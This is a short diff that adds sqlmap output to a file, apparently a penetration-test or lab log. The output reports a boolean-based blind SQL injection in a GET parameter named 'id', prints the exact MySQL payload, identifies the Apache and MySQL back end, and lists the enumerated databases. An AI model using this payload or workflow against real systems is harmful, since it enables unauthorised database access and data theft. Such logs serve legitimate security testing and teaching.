@@ -28,3 +28,16 @@ available databases [2]:
 [*] DBL02200
 [*] information_schema
 
+sqlmap identified the following injection point(s) with a total of 34 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: MySQL >= 5.0 boolean-based blind - Parameter replace
+    Payload: id=(SELECT (CASE WHEN (7569=7569) THEN 7569 ELSE 7569*(SELECT 7569 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] DBL02200
+[*] information_schema
+
